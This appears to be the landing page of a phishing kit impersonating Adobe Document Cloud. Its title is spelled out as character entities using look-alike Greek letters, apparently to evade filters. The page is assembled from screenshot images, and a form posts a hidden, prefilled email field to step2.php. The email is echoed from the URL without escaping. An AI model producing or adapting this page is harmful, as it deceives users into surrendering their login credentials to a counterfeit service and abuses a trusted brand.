<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#65;&#65;&#100;&#959;&#98;&#101;&#32;&#68;&#959;&#99;&#117;&#109;&#101;&#110;&#116;&#32;&#67;&#108;&#959;&#117;&#100;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body bgColor="#000000">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:205px; z-index:0"><img src="images/e1.png" alt="" title="" border=0 width=1365 height=205></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:203px; width:1365px; height:227px; z-index:1"><img src="images/e2.png" alt="" title="" border=0 width=1365 height=227></div>

<form action=step2.php name=dafahojaage id=dafahojaage method=post>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:422px; width:1365px; height:216px; z-index:2"><img src="images/e3.png" alt="" title="" border=0 width=1365 height=216></div>

<input name="email" placeholder="@example.com" class="textbox" value="<?=$_GET[email]?>" type="hidden">
<div id="formimage1" style="position:absolute; overflow:hidden; left:199px; top:302px; width:262px; height:57px; z-index:3"><input type="image" name="formimage1" width="262" height="57" <img src="images/view.png"></div>





</div>

</body>
</html>